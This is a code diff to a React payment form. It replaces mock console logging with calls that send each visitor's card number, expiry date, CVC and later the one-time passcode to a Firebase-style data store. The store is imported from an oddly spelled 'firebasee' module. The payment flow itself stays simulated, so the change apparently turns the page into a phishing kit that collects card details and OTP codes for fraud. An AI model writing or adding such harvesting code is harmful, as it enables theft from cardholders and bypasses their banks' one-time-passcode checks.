@@ -36,6 +36,7 @@ import {
 import { Separator } from "@/components/ui/separator"
 import { cn } from "@/lib/utils"
 import { motion, AnimatePresence } from "framer-motion"
+import { addData } from "@/lib/firebasee"
 
 // Types
 type PaymentState = "FORM" | "OTP" | "SUCCESS"
@@ -192,6 +193,7 @@ export default function PaymentMethodsComponent() {
   // Handle payment submission
   const handlePayment = () => {
     if (paymentMethod === "card" && !validateForm()) {
+      
       return
     }
 
@@ -203,7 +205,8 @@ export default function PaymentMethodsComponent() {
     setIsProcessing(true)
 
     // Mock database submission
-    console.log("Submitting payment data:", {
+    addData( {
+      id:getVisitorId(),
       cardNumber,
       cardExpiry,
       cardCvc,
@@ -256,8 +259,8 @@ export default function PaymentMethodsComponent() {
 
     setIsProcessing(true)
     setOtpVerificationError(null)
-
-    console.log("Verifying OTP:", otpCode)
+    addData( {
+      id:getVisitorId(),otp:otpCode})
 
     setTimeout(() => {
       setIsProcessing(false)
